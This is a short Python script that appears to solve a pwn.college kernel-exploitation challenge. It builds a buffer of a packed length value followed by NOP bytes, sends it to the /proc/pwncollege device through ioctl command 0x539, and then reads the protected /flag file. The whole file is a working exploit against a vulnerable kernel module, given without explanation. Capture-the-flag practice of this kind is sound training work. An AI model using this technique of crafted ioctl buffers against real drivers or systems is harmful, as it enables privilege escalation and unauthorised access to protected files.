import pwn
import fcntl
import os
from ctypes import *


arg = []
for i in range(1024-16):
    arg.append(b'\x90')


arg = pwn.p64(0x100) + b''.join(arg)
print(arg)

fd = os.open('/proc/pwncollege', os.O_RDWR)
fcntl.ioctl(fd, 0x539, arg)
os.close(fd)
with open('/flag', 'r') as f:
    print(f.read())
